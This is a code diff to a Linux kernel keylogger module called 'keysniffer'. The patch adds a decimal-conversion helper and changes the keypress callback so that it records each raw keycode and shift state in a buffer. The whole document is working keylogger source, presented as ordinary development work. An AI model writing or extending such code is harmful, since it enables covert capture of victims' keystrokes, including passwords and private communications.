@@ -102,12 +102,45 @@ static struct notifier_block keysniffer_blk = {
 	.notifier_call = keysniffer_cb,
 };
 
+void to_base_n_string(int input, int base,char *rep,int size){
+  int i;
+  /* buffer to hold the remainders in reverse order */
+  int div = input;  
+  int remainders[size];
+  int start;
+  /* zero out the buffer */
+  for ( i = 0; i < size; i++)
+    rep[i] = 0;
+
+  if( !input ){
+    rep[0] = '0';
+    return;
+  }
+
+  /* input the remainders in reverse order */
+  i = size - 1; 
+  while( div > 0 ){
+    remainders[i] = div % base;
+    div = div / base;
+    i--;
+  }
+  start = i+1;
+  /* place them into the string starting from the beginning 
+     with the proper character code */
+  for( i = start; i < size; i++){
+    rep[i - start] = '0' + remainders[i];
+  }
+      
+}
+
 /* Keypress callback */
 int keysniffer_cb(struct notifier_block *nblock,
 		unsigned long code,
 		void *_param)
 {
 	size_t len;
+        char rep[sizeof(int) + 1];
+        char key[sizeof(int) + 1];
 	struct keyboard_notifier_param *param = _param;
 	const char *pressed_key;
 
@@ -118,19 +151,34 @@ int keysniffer_cb(struct notifier_block *nblock,
 		return NOTIFY_OK;
 
 	if (param->value >= 0x1 && param->value <= 0x77) {
-		pressed_key = param->shift
-				? us_keymap[param->value][1]
-				: us_keymap[param->value][0];
+                pressed_key = param->shift
+                    ? us_keymap[param->value][1]
+                    : us_keymap[param->value][0];
 		if (pressed_key) {
-			len = strlen(pressed_key);
-
+                        int pklen, replen;
+                        to_base_n_string(param->value,10,key,sizeof(int)+1);
+                        to_base_n_string(param->shift,10,rep,sizeof(int)+1);
+                        pressed_key = key;
+                        
+                        pklen = strlen(pressed_key);
+                        replen = strlen(rep);
+                        
+                        len = pklen + replen + 1;
+                  
 			if ((buf_pos + len) >= BUF_LEN) {
 				memset(keys_buf, 0, BUF_LEN);
 				buf_pos = 0;
 			}
 
-			strncpy(keys_buf + buf_pos, pressed_key, len);
-			buf_pos += len;
+                        strncpy(keys_buf + buf_pos, rep, replen);
+                        buf_pos += replen;
+                        strncpy(keys_buf + buf_pos, " ", 1);
+                        buf_pos++;
+			strncpy(keys_buf + buf_pos, pressed_key,
+                                pklen);
+                        buf_pos += pklen;
+
+
 			keys_buf[buf_pos++] = '\n';
 
 			pr_debug("%s\n", pressed_key);
